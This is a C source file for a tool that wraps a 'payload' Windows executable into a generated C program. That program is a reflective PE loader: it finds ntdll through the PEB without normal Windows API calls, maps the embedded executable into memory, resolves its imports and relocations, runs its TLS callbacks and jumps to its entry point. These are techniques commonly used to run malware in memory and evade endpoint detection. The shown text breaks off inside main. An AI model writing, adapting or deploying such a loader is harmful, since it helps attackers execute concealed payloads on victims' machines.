/**
 * exe_to_embedded_loader.c
 *
 * Compilation: gcc exe_to_embedded_loader.c -o exe_to_embedded_loader
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef _WIN32
#include <windows.h>
#else
typedef uint32_t DWORD;
typedef uint16_t WORD;
typedef uint8_t BYTE;
typedef uint64_t ULONG_PTR;
typedef uint64_t SIZE_T;

#pragma pack(push, 1)
typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip;
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    int32_t e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    WORD Machine;
    WORD NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;
    WORD SizeOfOptionalHeader;
    WORD Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD Magic;
    BYTE MajorLinkerVersion;
    BYTE MinorLinkerVersion;
    DWORD SizeOfCode;
    DWORD SizeOfInitializedData;
    DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;
    DWORD BaseOfCode;
    ULONG_PTR ImageBase;
    DWORD SectionAlignment;
    DWORD FileAlignment;
    WORD MajorOperatingSystemVersion;
    WORD MinorOperatingSystemVersion;
    WORD MajorImageVersion;
    WORD MinorImageVersion;
    WORD MajorSubsystemVersion;
    WORD MinorSubsystemVersion;
    DWORD Win32VersionValue;
    DWORD SizeOfImage;
    DWORD SizeOfHeaders;
    DWORD CheckSum;
    WORD Subsystem;
    WORD DllCharacteristics;
    ULONG_PTR SizeOfStackReserve;
    ULONG_PTR SizeOfStackCommit;
    ULONG_PTR SizeOfHeapReserve;
    ULONG_PTR SizeOfHeapCommit;
    DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;
    } Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
#pragma pack(pop)
#endif

const char* default_template =
    "/**\n"
    " * loader_template.c - Enhanced Reflective Loader (Zero WinAPI Dependency)\n"
    " *\n"
    " * This template is used to wrap a payload EXE.\n"
    " * It provides better support for exceptions (x64) and TLS.\n"
    " * It manually resolves all necessary functions from ntdll.dll via PEB.\n"
    " */\n"
    "\n"
    "#include <windows.h>\n"
    "\n"
    "#ifndef NTSTATUS\n"
    "typedef LONG NTSTATUS;\n"
    "#endif\n"
    "\n"
    "#ifndef UNICODE_STRING\n"
    "typedef struct _UNICODE_STRING {\n"
    "    USHORT Length;\n"
    "    USHORT MaximumLength;\n"
    "    PWSTR  Buffer;\n"
    "} UNICODE_STRING, *PUNICODE_STRING;\n"
    "#endif\n"
    "\n"
    "#ifndef ANSI_STRING\n"
    "typedef struct _ANSI_STRING {\n"
    "    USHORT Length;\n"
    "    USHORT MaximumLength;\n"
    "    PSTR   Buffer;\n"
    "} ANSI_STRING, *PANSI_STRING;\n"
    "#endif\n"
    "\n"
    "typedef struct _LIST_ENTRY {\n"
    "   struct _LIST_ENTRY *Flink;\n"
    "   struct _LIST_ENTRY *Blink;\n"
    "} LIST_ENTRY, *PLIST_ENTRY;\n"
    "\n"
    "typedef struct _PEB_LDR_DATA {\n"
    "    ULONG Length;\n"
    "    BOOLEAN Initialized;\n"
    "    HANDLE SsHandle;\n"
    "    LIST_ENTRY InLoadOrderModuleList;\n"
    "    LIST_ENTRY InMemoryOrderModuleList;\n"
    "    LIST_ENTRY InInitializationOrderModuleList;\n"
    "    PVOID EntryInProgress;\n"
    "    BOOLEAN ShutdownInProgress;\n"
    "    HANDLE ShutdownThreadId;\n"
    "} PEB_LDR_DATA, *PPEB_LDR_DATA;\n"
    "\n"
    "typedef struct _LDR_DATA_TABLE_ENTRY {\n"
    "    LIST_ENTRY InLoadOrderLinks;\n"
    "    LIST_ENTRY InMemoryOrderLinks;\n"
    "    LIST_ENTRY InInitializationOrderLinks;\n"
    "    PVOID DllBase;\n"
    "    PVOID EntryPoint;\n"
    "    ULONG SizeOfImage;\n"
    "    UNICODE_STRING FullDllName;\n"
    "    UNICODE_STRING BaseDllName;\n"
    "} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;\n"
    "\n"
    "// NTDLL function pointers\n"
    "typedef NTSTATUS (NTAPI *pLdrLoadDll)(\n"
    "    PWSTR DllPath,\n"
    "    PULONG DllCharacteristics,\n"
    "    PUNICODE_STRING DllName,\n"
    "    PVOID *DllHandle\n"
    ");\n"
    "\n"
    "typedef NTSTATUS (NTAPI *pLdrGetProcedureAddress)(\n"
    "    PVOID DllHandle,\n"
    "    PANSI_STRING ProcedureName,\n"
    "    ULONG ProcedureNumber,\n"
    "    PVOID *ProcedureAddress\n"
    ");\n"
    "\n"
    "typedef VOID (NTAPI *pRtlInitAnsiString)(\n"
    "    PANSI_STRING DestinationString,\n"
    "    const char* SourceString\n"
    ");\n"
    "\n"
    "typedef NTSTATUS (NTAPI *pRtlAnsiStringToUnicodeString)(\n"
    "    PUNICODE_STRING DestinationString,\n"
    "    PANSI_STRING SourceString,\n"
    "    BOOLEAN AllocateDestinationString\n"
    ");\n"
    "\n"
    "typedef VOID (NTAPI *pRtlFreeUnicodeString)(\n"
    "    PUNICODE_STRING UnicodeString\n"
    ");\n"
    "\n"
    "typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(\n"
    "    HANDLE ProcessHandle,\n"
    "    PVOID *BaseAddress,\n"
    "    ULONG_PTR ZeroBits,\n"
    "    PSIZE_T RegionSize,\n"
    "    ULONG AllocationType,\n"
    "    ULONG Protect\n"
    ");\n"
    "\n"
    "typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(\n"
    "    HANDLE ProcessHandle,\n"
    "    PVOID *BaseAddress,\n"
    "    PSIZE_T RegionSize,\n"
    "    ULONG NewProtect,\n"
    "    PULONG OldProtect\n"
    ");\n"
    "\n"
    "typedef NTSTATUS (NTAPI *pNtFlushInstructionCache)(\n"
    "    HANDLE ProcessHandle,\n"
    "    PVOID BaseAddress,\n"
    "    SIZE_T Length\n"
    ");\n"
    "\n"
    "typedef struct _API_SET_NAMESPACE {\n"
    "    ULONG Version;\n"
    "    ULONG Size;\n"
    "    ULONG Flags;\n"
    "    ULONG Count;\n"
    "    ULONG EntryOffset;\n"
    "    ULONG HashOffset;\n"
    "    ULONG HashFactor;\n"
    "} API_SET_NAMESPACE, *PAPI_SET_NAMESPACE;\n"
    "\n"
    "typedef struct _API_SET_NAMESPACE_ENTRY {\n"
    "    ULONG Flags;\n"
    "    ULONG NameOffset;\n"
    "    ULONG NameLength;\n"
    "    ULONG AliasLength;\n"
    "    ULONG ValueOffset;\n"
    "    ULONG ValueCount;\n"
    "} API_SET_NAMESPACE_ENTRY, *PAPI_SET_NAMESPACE_ENTRY;\n"
    "\n"
    "typedef struct _API_SET_VALUE_ENTRY {\n"
    "    ULONG Flags;\n"
    "    ULONG NameOffset;\n"
    "    ULONG NameLength;\n"
    "    ULONG ValueOffset;\n"
    "    ULONG ValueLength;\n"
    "} API_SET_VALUE_ENTRY, *PAPI_SET_VALUE_ENTRY;\n"
    "\n"
    "#ifndef MAX_PATH\n"
    "#define MAX_PATH 260\n"
    "#endif\n"
    "\n"
    "#ifdef _MSC_VER\n"
    "#include <intrin.h>\n"
    "#define READ_PEB() (PVOID)__readgsqword(0x60)\n"
    "#else\n"
    "#ifdef _WIN64\n"
    "static __inline__ PVOID READ_PEB() {\n"
    "    PVOID peb;\n"
    "    __asm__(\"mov %%gs:0x60, %0\" : \"=r\" (peb));\n"
    "    return peb;\n"
    "}\n"
    "#else\n"
    "static __inline__ PVOID READ_PEB() {\n"
    "    PVOID peb;\n"
    "    __asm__(\"mov %%fs:0x30, %0\" : \"=r\" (peb));\n"
    "    return peb;\n"
    "}\n"
    "#endif\n"
    "#endif\n"
    "\n"
    "// Helper functions for manual resolution\n"
    "static int my_strlen(const char* s) {\n"
    "    int l = 0;\n"
    "    while (s && s[l]) l++;\n"
    "    return l;\n"
    "}\n"
    "\n"
    "static int my_strcmp(const char* s1, const char* s2) {\n"
    "    if (!s1 || !s2) return -1;\n"
    "    while (*s1 && (*s1 == *s2)) {\n"
    "        s1++; s2++;\n"
    "    }\n"
    "    return *(unsigned char*)s1 - *(unsigned char*)s2;\n"
    "}\n"
    "\n"
    "static int my_strncmp(const char* s1, const char* s2, size_t n) {\n"
    "    if (!s1 || !s2) return -1;\n"
    "    while (n && *s1 && (*s1 == *s2)) {\n"
    "        s1++; s2++; n--;\n"
    "    }\n"
    "    if (n == 0) return 0;\n"
    "    return *(unsigned char*)s1 - *(unsigned char*)s2;\n"
    "}\n"
    "\n"
    "static void* my_memcpy(void* dest, const void* src, size_t n) {\n"
    "    char* d = (char*)dest;\n"
    "    const char* s = (const char*)src;\n"
    "    while (n--) *d++ = *s++;\n"
    "    return dest;\n"
    "}\n"
    "\n"
    "// Forward declarations\n"
    "void resolve_api_set(const char* dll_name, char* out_name);\n"
    "PVOID get_export_address_manual(HMODULE h_module, const char* func_name, pRtlInitAnsiString _RtlInitAnsiString, pLdrGetProcedureAddress _LdrGetProcedureAddress, pLdrLoadDll _LdrLoadDll, pRtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString, pRtlFreeUnicodeString _RtlFreeUnicodeString);\n"
    "HMODULE get_module_base_manual(const char* module_name);\n"
    "\n"
    "HMODULE get_module_base_manual(const char* module_name) {\n"
    "    PVOID peb = READ_PEB();\n"
    "    // Ldr is at 0x18 on x64, 0x0C on x86\n"
    "    PPEB_LDR_DATA ldr = *(PPEB_LDR_DATA*)((char*)peb + (sizeof(PVOID) == 8 ? 0x18 : 0x0c));\n"
    "    PLIST_ENTRY head = &ldr->InLoadOrderModuleList;\n"
    "    PLIST_ENTRY curr = head->Flink;\n"
    "\n"
    "    while (curr != head) {\n"
    "        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)curr;\n"
    "        if (module_name == NULL) return (HMODULE)entry->DllBase;\n"
    "\n"
    "        const char* base_name = module_name;\n"
    "        PWCHAR entry_name = entry->BaseDllName.Buffer;\n"
    "        int match = 1;\n"
    "        int j = 0;\n"
    "        while (base_name[j] != '\\0') {\n"
    "            WCHAR c1 = (WCHAR)base_name[j];\n"
    "            WCHAR c2 = entry_name[j];\n"
    "            if (c1 >= 'A' && c1 <= 'Z') c1 += 32;\n"
    "            if (c2 >= L'A' && c2 <= L'Z') c2 += 32;\n"
    "            if (c1 != c2) {\n"
    "                match = 0;\n"
    "                break;\n"
    "            }\n"
    "            j++;\n"
    "        }\n"
    "        if (match && (entry_name[j] == L'\\0' || entry_name[j] == L'.')) return (HMODULE)entry->DllBase;\n"
    "\n"
    "        curr = curr->Flink;\n"
    "    }\n"
    "    return NULL;\n"
    "}\n"
    "\n"
    "void resolve_api_set(const char* dll_name, char* out_name) {\n"
    "    if (my_strncmp(dll_name, \"api-\", 4) != 0 && my_strncmp(dll_name, \"ext-\", 4) != 0) {\n"
    "        int i = 0;\n"
    "        while (dll_name[i]) { out_name[i] = dll_name[i]; i++; }\n"
    "        out_name[i] = '\\0';\n"
    "        return;\n"
    "    }\n"
    "\n"
    "    PVOID peb = READ_PEB();\n"
    "    PAPI_SET_NAMESPACE api_set_map = *(PAPI_SET_NAMESPACE*)((char*)peb + (sizeof(PVOID) == 8 ? 0x68 : 0x38));\n"
    "    \n"
    "    if (api_set_map->Version < 6) {\n"
    "        int i = 0;\n"
    "        while (dll_name[i]) { out_name[i] = dll_name[i]; i++; }\n"
    "        out_name[i] = '\\0';\n"
    "        return;\n"
    "    }\n"
    "\n"
    "    PAPI_SET_NAMESPACE_ENTRY entries = (PAPI_SET_NAMESPACE_ENTRY)((char*)api_set_map + api_set_map->EntryOffset);\n"
    "    size_t dll_name_len = my_strlen(dll_name);\n"
    "    if (dll_name_len > 4 && (dll_name[dll_name_len - 4] == '.')) {\n"
    "        dll_name_len -= 4;\n"
    "    }\n"
    "\n"
    "    for (ULONG i = 0; i < api_set_map->Count; i++) {\n"
    "        PAPI_SET_NAMESPACE_ENTRY entry = &entries[i];\n"
    "        PWCHAR name = (PWCHAR)((char*)api_set_map + entry->NameOffset);\n"
    "        \n"
    "        if (dll_name_len == (size_t)entry->NameLength / 2) {\n"
    "            int match = 1;\n"
    "            for (size_t j = 0; j < dll_name_len; j++) {\n"
    "                WCHAR c1 = (WCHAR)dll_name[j];\n"
    "                WCHAR c2 = name[j];\n"
    "                if (c1 >= 'A' && c1 <= 'Z') c1 += 32;\n"
    "                if (c2 >= L'A' && c2 <= L'Z') c2 += 32;\n"
    "                if (c1 != c2) { match = 0; break; }\n"
    "            }\n"
    "\n"
    "            if (match) {\n"
    "                PAPI_SET_VALUE_ENTRY values = (PAPI_SET_VALUE_ENTRY)((char*)api_set_map + entry->ValueOffset);\n"
    "                if (entry->ValueCount > 0) {\n"
    "                    PAPI_SET_VALUE_ENTRY value = &values[0];\n"
    "                    PWCHAR target_dll_wide = (PWCHAR)((char*)api_set_map + value->ValueOffset);\n"
    "                    ULONG target_dll_len = value->ValueLength / 2;\n"
    "                    for (ULONG k = 0; k < target_dll_len; k++) out_name[k] = (char)target_dll_wide[k];\n"
    "                    out_name[target_dll_len] = '\\0';\n"
    "                    return;\n"
    "                }\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    int k = 0;\n"
    "    while (dll_name[k]) { out_name[k] = dll_name[k]; k++; }\n"
    "    out_name[k] = '\\0';\n"
    "}\n"
    "\n"
    "PVOID get_export_address_manual(HMODULE h_module, const char* func_name, pRtlInitAnsiString _RtlInitAnsiString, pLdrGetProcedureAddress _LdrGetProcedureAddress, pLdrLoadDll _LdrLoadDll, pRtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString, pRtlFreeUnicodeString _RtlFreeUnicodeString) {\n"
    "    if (!h_module) return NULL;\n"
    "    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)h_module;\n"
    "    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((char*)h_module + dos_header->e_lfanew);\n"
    "    IMAGE_DATA_DIRECTORY export_dir_info = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];\n"
    "    if (export_dir_info.Size == 0) return NULL;\n"
    "    \n"
    "    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((char*)h_module + export_dir_info.VirtualAddress);\n"
    "    PDWORD names = (PDWORD)((char*)h_module + export_dir->AddressOfNames);\n"
    "    PDWORD functions = (PDWORD)((char*)h_module + export_dir->AddressOfFunctions);\n"
    "    PWORD ordinals = (PWORD)((char*)h_module + export_dir->AddressOfNameOrdinals);\n"
    "    \n"
    "    PVOID addr = NULL;\n"
    "    if (IMAGE_SNAP_BY_ORDINAL((ULONG_PTR)func_name)) {\n"
    "        WORD ordinal = (WORD)IMAGE_ORDINAL((ULONG_PTR)func_name) - (WORD)export_dir->Base;\n"
    "        addr = (PVOID)((char*)h_module + functions[ordinal]);\n"
    "    } else {\n"
    "        for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {\n"
    "            if (my_strcmp(func_name, (char*)h_module + names[i]) == 0) {\n"
    "                addr = (PVOID)((char*)h_module + functions[ordinals[i]]);\n"
    "                break;\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "    if (!addr) return NULL;\n"
    "\n"
    "    // Check for forwarded export\n"
    "    if ((char*)addr >= (char*)export_dir && (char*)addr < (char*)export_dir + export_dir_info.Size) {\n"
    "        char forward_str[MAX_PATH];\n"
    "        int i = 0;\n"
    "        while (((char*)addr)[i] != '\\0' && i < MAX_PATH - 1) {\n"
    "            forward_str[i] = ((char*)addr)[i];\n"
    "            i++;\n"
    "        }\n"
    "        forward_str[i] = '\\0';\n"
    "        char* dot = NULL;\n"
    "        for (int j = 0; j < i; j++) { if (forward_str[j] == '.') { dot = &forward_str[j]; break; } }\n"
    "        if (dot) {\n"
    "            *dot = '\\0';\n"
    "            char dll_name[MAX_PATH];\n"
    "            int k = 0;\n"
    "            while (forward_str[k]) { dll_name[k] = forward_str[k]; k++; }\n"
    "            int has_ext = 0;\n"
    "            for(int m=0; m<k; m++) if(dll_name[m] == '.') has_ext = 1;\n"
    "            if(!has_ext) { dll_name[k++] = '.'; dll_name[k++] = 'd'; dll_name[k++] = 'l'; dll_name[k++] = 'l'; dll_name[k] = '\\0'; }\n"
    "            else dll_name[k] = '\\0';\n"
    "            char real_dll[MAX_PATH];\n"
    "            resolve_api_set(dll_name, real_dll);\n"
    "            HMODULE h_forward = get_module_base_manual(real_dll);\n"
    "            if (!h_forward) {\n"
    "                ANSI_STRING a_dll; UNICODE_STRING u_dll;\n"
    "                _RtlInitAnsiString(&a_dll, real_dll);\n"
    "                _RtlAnsiStringToUnicodeString(&u_dll, &a_dll, TRUE);\n"
    "                _LdrLoadDll(NULL, NULL, &u_dll, (PVOID*)&h_forward);\n"
    "                _RtlFreeUnicodeString(&u_dll);\n"
    "            }\n"
    "            if (h_forward) return get_export_address_manual(h_forward, dot + 1, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "        }\n"
    "    }\n"
    "    return addr;\n"
    "}\n"
    "\n"
    "// PE_BLOB_ARRAY\n"
    "unsigned char pe_blob[] = { 0 };\n"
    "\n"
    "// ENTRY_POINT_RVA\n"
    "DWORD entry_point_rva = 0;\n"
    "\n"
    "// IMAGE_BASE\n"
    "ULONG_PTR image_base = 0;\n"
    "\n"
    "// SIZE_OF_IMAGE\n"
    "SIZE_T size_of_image = 0;\n"
    "\n"
    "typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);\n"
    "\n"
    "void load_pe() {\n"
    "    HMODULE h_ntdll = get_module_base_manual(\"ntdll.dll\");\n"
    "    pRtlInitAnsiString _RtlInitAnsiString = (pRtlInitAnsiString)get_export_address_manual(h_ntdll, \"RtlInitAnsiString\", NULL, NULL, NULL, NULL, NULL);\n"
    "    pLdrGetProcedureAddress _LdrGetProcedureAddress = (pLdrGetProcedureAddress)get_export_address_manual(h_ntdll, \"LdrGetProcedureAddress\", NULL, NULL, NULL, NULL, NULL);\n"
    "    pLdrLoadDll _LdrLoadDll = (pLdrLoadDll)get_export_address_manual(h_ntdll, \"LdrLoadDll\", NULL, NULL, NULL, NULL, NULL);\n"
    "    pRtlAnsiStringToUnicodeString _RtlAnsiStringToUnicodeString = (pRtlAnsiStringToUnicodeString)get_export_address_manual(h_ntdll, \"RtlAnsiStringToUnicodeString\", NULL, NULL, NULL, NULL, NULL);\n"
    "    pRtlFreeUnicodeString _RtlFreeUnicodeString = (pRtlFreeUnicodeString)get_export_address_manual(h_ntdll, \"RtlFreeUnicodeString\", NULL, NULL, NULL, NULL, NULL);\n"
    "    pNtAllocateVirtualMemory _NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)get_export_address_manual(h_ntdll, \"NtAllocateVirtualMemory\", NULL, NULL, NULL, NULL, NULL);\n"
    "    pNtProtectVirtualMemory _NtProtectVirtualMemory = (pNtProtectVirtualMemory)get_export_address_manual(h_ntdll, \"NtProtectVirtualMemory\", NULL, NULL, NULL, NULL, NULL);\n"
    "\n"
    "    PIMAGE_DOS_HEADER dos_header_raw = (PIMAGE_DOS_HEADER)pe_blob;\n"
    "    PIMAGE_NT_HEADERS nt_headers_raw = (PIMAGE_NT_HEADERS)((char*)pe_blob + dos_header_raw->e_lfanew);\n"
    "    PVOID pe_buffer = NULL;\n"
    "    SIZE_T image_size = nt_headers_raw->OptionalHeader.SizeOfImage;\n"
    "    _NtAllocateVirtualMemory((HANDLE)-1, &pe_buffer, 0, &image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n"
    "    if (!pe_buffer) return;\n"
    "\n"
    "    my_memcpy(pe_buffer, pe_blob, nt_headers_raw->OptionalHeader.SizeOfHeaders);\n"
    "    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt_headers_raw);\n"
    "    for (int i = 0; i < nt_headers_raw->FileHeader.NumberOfSections; i++) {\n"
    "        if (sections[i].PointerToRawData != 0) {\n"
    "            my_memcpy((char*)pe_buffer + sections[i].VirtualAddress, (char*)pe_blob + sections[i].PointerToRawData, sections[i].SizeOfRawData);\n"
    "        }\n"
    "    }\n"
    "\n"
    "    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((char*)pe_buffer + ((PIMAGE_DOS_HEADER)pe_buffer)->e_lfanew);\n"
    "    IMAGE_DATA_DIRECTORY import_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];\n"
    "    if (import_dir.Size > 0) {\n"
    "        PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((char*)pe_buffer + import_dir.VirtualAddress);\n"
    "        while (import_desc->Name) {\n"
    "            char resolved_dll[MAX_PATH];\n"
    "            resolve_api_set((char*)pe_buffer + import_desc->Name, resolved_dll);\n"
    "            ANSI_STRING ansi_dll; UNICODE_STRING uni_dll;\n"
    "            _RtlInitAnsiString(&ansi_dll, resolved_dll);\n"
    "            _RtlAnsiStringToUnicodeString(&uni_dll, &ansi_dll, TRUE);\n"
    "            HANDLE h_module = NULL;\n"
    "            _LdrLoadDll(NULL, NULL, &uni_dll, &h_module);\n"
    "            _RtlFreeUnicodeString(&uni_dll);\n"
    "            if (h_module) {\n"
    "                PIMAGE_THUNK_DATA first_thunk = (PIMAGE_THUNK_DATA)((char*)pe_buffer + import_desc->FirstThunk);\n"
    "                PIMAGE_THUNK_DATA original_first_thunk = (PIMAGE_THUNK_DATA)((char*)pe_buffer + import_desc->OriginalFirstThunk);\n"
    "                if (!import_desc->OriginalFirstThunk) original_first_thunk = first_thunk;\n"
    "                while (original_first_thunk->u1.AddressOfData) {\n"
    "                    PVOID addr = NULL;\n"
    "                    if (IMAGE_SNAP_BY_ORDINAL(original_first_thunk->u1.Ordinal)) {\n"
    "                        addr = get_export_address_manual((HMODULE)h_module, (char*)original_first_thunk->u1.Ordinal, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "                    } else {\n"
    "                        PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)((char*)pe_buffer + original_first_thunk->u1.AddressOfData);\n"
    "                        addr = get_export_address_manual((HMODULE)h_module, (char*)import_by_name->Name, _RtlInitAnsiString, _LdrGetProcedureAddress, _LdrLoadDll, _RtlAnsiStringToUnicodeString, _RtlFreeUnicodeString);\n"
    "                    }\n"
    "                    first_thunk->u1.Function = (ULONG_PTR)addr;\n"
    "                    first_thunk++; original_first_thunk++;\n"
    "                }\n"
    "            }\n"
    "            import_desc++;\n"
    "        }\n"
    "    }\n"
    "\n"
    "    ULONG_PTR delta = (ULONG_PTR)pe_buffer - nt_headers->OptionalHeader.ImageBase;\n"
    "    if (delta != 0) {\n"
    "        IMAGE_DATA_DIRECTORY reloc_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n"
    "        if (reloc_dir.Size > 0) {\n"
    "            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((char*)pe_buffer + reloc_dir.VirtualAddress);\n"
    "            while (reloc->VirtualAddress != 0) {\n"
    "                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n"
    "                WORD* list = (WORD*)((char*)reloc + sizeof(IMAGE_BASE_RELOCATION));\n"
    "                for (DWORD i = 0; i < count; i++) {\n"
    "                    WORD type = list[i] >> 12; WORD offset = list[i] & 0xFFF;\n"
    "                    if (type == IMAGE_REL_BASED_DIR64) *(ULONG_PTR*)((char*)pe_buffer + reloc->VirtualAddress + offset) += delta;\n"
    "                    else if (type == IMAGE_REL_BASED_HIGHLOW) *(DWORD*)((char*)pe_buffer + reloc->VirtualAddress + offset) += (DWORD)delta;\n"
    "                }\n"
    "                reloc = (PIMAGE_BASE_RELOCATION)((char*)reloc + reloc->SizeOfBlock);\n"
    "            }\n"
    "        }\n"
    "    }\n"
    "\n"
    "#ifdef _WIN64\n"
    "    IMAGE_DATA_DIRECTORY exception_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];\n"
    "    if (exception_dir.Size > 0) {\n"
    "        typedef BOOL (WINAPI *RAFA)(PRUNTIME_FUNCTION, DWORD, DWORD64);\n"
    "        RAFA pRtlAddFunctionTable = (RAFA)get_export_address_manual(h_ntdll, \"RtlAddFunctionTable\", NULL, NULL, NULL, NULL, NULL);\n"
    "        if (pRtlAddFunctionTable) pRtlAddFunctionTable((PRUNTIME_FUNCTION)((char*)pe_buffer + exception_dir.VirtualAddress), exception_dir.Size / sizeof(RUNTIME_FUNCTION), (ULONG_PTR)pe_buffer);\n"
    "    }\n"
    "#endif\n"
    "\n"
    "    IMAGE_DATA_DIRECTORY tls_dir = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];\n"
    "    if (tls_dir.Size > 0) {\n"
    "        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)((char*)pe_buffer + tls_dir.VirtualAddress);\n"
    "        PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;\n"
    "        if (callbacks) { while (*callbacks) { (*callbacks)(pe_buffer, DLL_PROCESS_ATTACH, NULL); callbacks++; } }\n"
    "    }\n"
    "\n"
    "    sections = IMAGE_FIRST_SECTION(nt_headers);\n"
    "    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {\n"
    "        DWORD protection = 0;\n"
    "        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {\n"
    "            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_EXECUTE_READWRITE;\n"
    "            else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) protection = PAGE_EXECUTE_READ;\n"
    "            else protection = PAGE_EXECUTE;\n"
    "        } else {\n"
    "            if (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) protection = PAGE_READWRITE;\n"
    "            else if (sections[i].Characteristics & IMAGE_SCN_MEM_READ) protection = PAGE_READONLY;\n"
    "            else protection = PAGE_NOACCESS;\n"
    "        }\n"
    "        PVOID section_base = (char*)pe_buffer + sections[i].VirtualAddress;\n"
    "        SIZE_T section_size = sections[i].Misc.VirtualSize;\n"
    "        ULONG old; _NtProtectVirtualMemory((HANDLE)-1, &section_base, &section_size, protection, &old);\n"
    "    }\n"
    "    pNtFlushInstructionCache _NtFlushInstructionCache = (pNtFlushInstructionCache)get_export_address_manual(h_ntdll, \"NtFlushInstructionCache\", NULL, NULL, NULL, NULL, NULL);\n"
    "    if (_NtFlushInstructionCache) _NtFlushInstructionCache((HANDLE)-1, NULL, 0);\n"
    "    ((void(*)())((char*)pe_buffer + entry_point_rva))();\n"
    "}\n"
    "\n"
    "int main() {\n"
    "    load_pe();\n"
    "    return 0;\n"
    "}\n";

void print_hex_array(FILE* out, const uint8_t* data, size_t size) {
    fprintf(out, "unsigned char pe_blob[] = {");
    for (size_t i = 0; i < size; i++) {
        if (i % 12 == 0) fprintf(out, "\n    ");
        fprintf(out, "0x%02X%s", data[i], (i == size - 1) ? "" : ", ");
    }
    fprintf(out, "\n};\n");
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload.exe> [loader_template.c]\n", (argc > 0) ? argv[0] : "exe_to_embedded_loader");
        return 1;
    }

    const char* payload_path = argv[1];
    const char* template_path = (argc > 2) ? argv[2] : "loader_template.c";

    FILE* fp = fopen(payload_path, "rb");
    if (!fp) { perror("Error opening payload"); return 1; }
    fseek(fp, 0, SEEK_END);
    size_t file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    uint8_t* file_data = (uint8_t*)malloc(file_size);
    fread(file_data, 1, file_size, fp);
    fclose(fp);

    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)file_data;
    if (dos_header->e_magic != 0x5A4D) { printf("Invalid PE file\n"); return 1; }
